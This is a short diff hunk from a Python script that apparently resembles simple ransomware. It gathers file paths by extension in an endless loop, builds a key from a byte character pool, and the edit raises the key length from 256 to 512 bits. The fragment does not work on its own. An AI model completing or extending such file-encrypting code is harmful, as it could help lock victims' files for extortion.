@@ -67,7 +67,7 @@ while True:
                     if file_ext in encrypted_ext:
                         file_paths.append(root + '\\' + file)
             key = ''
-            encyption = 256 // 8
+            encyption = 512 // 8
             char_pool = ''
             for i in range(0x00, 0xFF):
                 char_pool += (chr(i))
